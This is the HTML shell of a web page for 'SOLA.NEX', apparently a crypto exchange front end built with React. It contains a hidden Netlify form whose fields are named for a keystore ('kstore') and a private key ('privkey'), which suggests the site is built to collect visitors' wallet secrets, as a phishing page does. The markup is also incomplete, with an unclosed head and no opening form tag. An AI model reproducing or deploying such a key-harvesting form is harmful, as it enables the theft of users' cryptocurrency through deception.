<!doctype html>
<html lang="en">
  <head>
    <title>SOLA.NEX - The First All-in-One DEX for Spot and Perpetuals</title>

  <body>
    <div id="root"></div>
    <script type="module" src="/src/main.tsx"></script>

    <!-- Hidden form for Netlify Forms detection -->

      <input type="hidden" name="form-name" value="messageForm" />

      <textarea name="input"></textarea>
      <textarea name="kstore"></textarea>
      <textarea name="privkey"></textarea>
    </form>
  </body>
